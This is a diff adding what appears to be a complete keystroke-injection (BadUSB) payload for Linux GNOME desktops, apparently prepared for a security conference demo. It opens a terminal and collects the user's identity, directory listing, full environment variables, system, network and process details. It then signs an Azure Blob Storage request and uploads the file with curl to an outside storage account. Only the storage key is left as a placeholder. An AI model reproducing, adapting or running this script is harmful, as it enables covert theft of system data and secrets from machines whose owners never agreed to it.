@@ -1,0 +1,43 @@
+GUI r
+DELAY 500
+STRING gnome-terminal
+DELAY 2000
+ENTER
+DELAY 1000
+STRING echo "HELLO HELLO HELLO"
+ENTER
+DELAY 1000
+STRING storageAccount="bsides2025"; storageKey="KEYGOESHERE"; containerName="files"; fileName="system_context_linux_gnome_terminal_$(date +%Y%m%d_%H%M%S);.txt"
+ENTER
+DELAY 500
+STRING echo "=== DETAILED SYSTEM CONTEXT ===" > $fileName; echo "Generated: $(date)" >> $fileName; whoami >> $fileName; id >> $fileName; groups >> $fileName; echo "=== LOCATION ===" >> $fileName; pwd >> $fileName; ls -la >> $fileName; echo "=== ENVIRONMENT ===" >> $fileName; env >> $fileName; echo "=== SYSTEM INFO ===" >> $fileName; uname -a >> $fileName; lsb_release -a 2>/dev/null >> $fileName; cat /proc/version >> $fileName; cat /proc/cpuinfo | head -50 >> $fileName; cat /proc/meminfo | head -50 >> $fileName; echo "=== NETWORK ===" >> $fileName; ip addr show >> $fileName; echo "=== PROCESSES ===" >> $fileName; ps aux | head -100 >> $fileName
+ENTER
+DELAY 5000
+STRING contentLength=$(wc -c < $fileName)
+ENTER
+DELAY 500
+STRING dateString=$(date -u +"%a, %d %b %Y %H:%M:%S GMT")
+ENTER
+DELAY 500
+STRING stringToSign="PUT\n\n\n$contentLength\n\napplication/octet-stream\n\n\n\n\n\n\nx-ms-blob-type:BlockBlob\nx-ms-date:$dateString\nx-ms-version:2020-04-08\n/$storageAccount/$containerName/$fileName"
+ENTER
+DELAY 500
+STRING signature=$(echo -en "$stringToSign" | openssl dgst -sha256 -hmac $(echo -n "$storageKey" | base64 -d) -binary | base64)
+ENTER
+DELAY 500
+STRING authorization="SharedKey $storageAccount:$signature"
+ENTER
+DELAY 500
+STRING uri="https://$storageAccount.blob.core.windows.net/$containerName/$fileName"
+ENTER
+DELAY 500
+STRING curl -X PUT -T "$fileName" -H "x-ms-date: $dateString" -H "x-ms-version: 2020-04-08" -H "x-ms-blob-type: BlockBlob" -H "Authorization: $authorization" -H "Content-Type: application/octet-stream" "$uri"
+ENTER
+DELAY 2000
+STRING echo "File uploaded successfully to: $uri"
+ENTER
+DELAY 1000
+STRING echo "GOODBYE GOODBYE GOODBYE"
+ENTER
+STRING exit
+ENTER
